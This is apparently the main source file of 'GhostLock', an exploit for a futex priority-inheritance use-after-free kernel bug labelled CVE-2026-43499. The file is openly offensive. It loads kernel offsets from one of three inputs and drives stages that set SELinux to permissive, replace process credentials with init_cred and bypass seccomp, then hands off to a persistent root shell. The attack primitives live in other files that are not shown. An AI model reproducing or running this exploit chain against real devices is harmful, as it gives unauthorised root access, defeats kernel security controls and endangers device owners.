/*
 * GhostLock — CVE-2026-43499 futex PI UAF exploit
 *
 * W1: SELinux permissive -> W2: cred = init_cred -> W3: seccomp bypass ->
 * independent root shell: ksud late-load + module watch.
 *
 * This translation unit is the thin adapter: parse, run the stage sequence and
 * map the outcome to the process exit code. Setup, attack primitives, victim
 * protocol and stage policy live in their own units under ghostlock::ops,
 * ghostlock::victim, ghostlock::race and ghostlock::stages.
 */

#include "legacy_support/legacy_entrypoint_starter.h"
#include "profile_entry.h"
#include "session/exploit_stages.hpp"

#include <string.h>

using namespace ghostlock;

/* Decoupling plan: native executable adapter and W1/W2/W3 orchestration.
 * Entry split: no argument -> legacy offsets.json; --ghostlock-app-call ->
 * GLK1 on stdin; --load-prebuilt-profile <bin> -> GLK1 file. All three produce
 * one decoded transport struct; the stage sequence only owns the session. */
int main(int argc, char **argv) {
    struct kernel_offsets decoded = {};
    char release_buf[256] = {0};
    int loaded = -1;

    if (argc == 1) {
        loaded = legacy_support::start_legacy_entrypoint(
                &decoded, release_buf, sizeof(release_buf));
    } else if (argc == 2 && strcmp(argv[1], "--ghostlock-app-call") == 0) {
        loaded = profile_entry::read_glk1_stdin(
                &decoded, release_buf, sizeof(release_buf));
    } else if (argc == 3 && strcmp(argv[1], "--load-prebuilt-profile") == 0) {
        loaded = profile_entry::read_glk1_file(
                argv[2], &decoded, release_buf, sizeof(release_buf));
    } else {
        pr_error("usage: %s [--ghostlock-app-call | --load-prebuilt-profile <bin>]\n",
                argv[0]);
        return 1;
    }
    if (loaded != 0) {
        pr_error("cannot load profile\n");
        return 1;
    }

    ExploitSession &session = g_exploit_session;
    if (stages::run_setup_stage(decoded) == stages::StageResult::Failed)
        return 1;

    switch (stages::run_w1_stage(session)) {
        case stages::StageResult::Failed:
            return 1;
        case stages::StageResult::Done:
            return 0;
        case stages::StageResult::Continue:
            break;
    }

    stages::VictimChain chain;
    if (stages::run_w2_w3_chain(session, &chain) ==
            stages::StageResult::Failed)
        return 1;
    return stages::run_handoff_stage(session, chain) ==
                    stages::StageResult::Failed
            ? 1 : 0;
}
